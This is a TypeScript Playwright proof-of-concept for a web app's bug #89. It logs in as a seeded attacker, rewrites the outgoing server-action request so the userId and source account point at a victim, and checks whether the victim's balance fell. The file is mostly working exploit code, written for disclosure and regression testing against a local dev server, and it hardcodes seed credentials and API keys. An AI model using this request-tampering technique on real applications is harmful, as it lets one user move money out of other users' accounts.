/**
 * #89 proof of concept — the WEB path lets a signed-in user move money out of
 * someone else's account, because the `sendMoneyToBankNumberAction` server
 * action trusts a `userId` that comes from the browser instead of the session.
 *
 * This logs in as the attacker in a real browser, submits a transfer, and
 * rewrites the outgoing server-action request so `userId` and `fromBankNumber`
 * point at the VICTIM. If the victim's balance drops, the hole is real.
 *
 * Run against a running app (dev server or develop):
 *   PW_BASE_URL=http://localhost:3000 pnpm tsx scripts/poc/spoof-userid.poc.ts
 * Needs the seed users (pnpm db:seed:users). Uses tiny amounts (1 token).
 *
 * DO NOT commit as a normal test — it is a live exploit. It is here so you can
 * watch it work, then delete it once #89 is fixed (after the fix it prints
 * "blocked", which is the regression signal).
 */
import { chromium } from "@playwright/test";

const BASE = process.env.PW_BASE_URL ?? "http://localhost:3000";
const ATTACKER = {
  email: "zachranNas+brno@pejsekAKocicka.cz",
  password: "PejsekAKocicka123",
  key: "key__0_zachrannas+brno@pejsekakocicka.cz00000000000000000000000",
};
const VICTIM = {
  email: "high.balance@example.com",
  key: "key__0_high.balance@example.com000000000000000000000000000000000",
  account: "100000000003/5555",
};

async function api(path: string, key: string) {
  const r = await fetch(`${BASE}/api/v1${path}`, { headers: { "X-API-Key": key } });
  return r.json();
}
async function idFor(key: string) {
  return (await api("/user", key)).data.id as string;
}
async function balanceOf(account: string, key: string) {
  const r = await api("/bank-account", key);
  const list = r.data.bankAccounts ?? r.data.items ?? r.data;
  return list.find((a: any) => a.number === account)?.balance as number;
}
async function firstAccount(key: string) {
  const r = await api("/bank-account", key);
  const list = r.data.bankAccounts ?? r.data.items ?? r.data;
  return { id: list[0].id as string, number: list[0].number as string };
}

(async () => {
  const attackerId = await idFor(ATTACKER.key);
  const victimId = await idFor(VICTIM.key);
  const attackerAcct = await firstAccount(ATTACKER.key);
  const before = await balanceOf(VICTIM.account, VICTIM.key);
  console.log(`victim ${VICTIM.account} balance before: ${before}`);

  const browser = await chromium.launch();
  const ctx = await browser.newContext({ baseURL: BASE });
  const page = await ctx.newPage();

  // rewrite any server-action request so the attacker's own id/account become the victim's
  await ctx.route("**/*", async (route) => {
    const req = route.request();
    let body = req.postData() ?? "";
    if (req.method() === "POST" && body.includes(attackerId)) {
      body = body.split(attackerId).join(victimId).split(attackerAcct.number).join(VICTIM.account);
      console.log("  rewrote server-action payload: userId + fromBankNumber -> victim");
      return route.continue({ postData: body });
    }
    return route.continue();
  });

  // log in as the attacker
  await page.goto("/signin");
  await page.getByLabel("Email").fill(ATTACKER.email);
  await page.getByLabel("Password").fill(ATTACKER.password);
  await page.locator("form").getByRole("button", { name: "Sign in" }).click();
  await page.waitForURL(/dashboard|\/$/);

  // open the attacker's own transfer page and submit a 1-token transfer
  await page.goto(`/bankAccount/${attackerAcct.id}`);
  await page.getByRole("combobox").click();
  await page.getByRole("option").first().click();
  await page.getByPlaceholder("Amount").fill("1");
  await page
    .getByRole("button", { name: /send|transfer|submit/i })
    .first()
    .click();
  await page.waitForTimeout(2500);
  await browser.close();

  const after = await balanceOf(VICTIM.account, VICTIM.key);
  console.log(`victim ${VICTIM.account} balance after:  ${after}`);
  console.log(
    before !== after
      ? `\n>>> VULNERABLE: ${before - after} token(s) left the victim's account without their session.`
      : `\n>>> blocked: victim balance unchanged. #89 looks fixed.`,
  );
})();
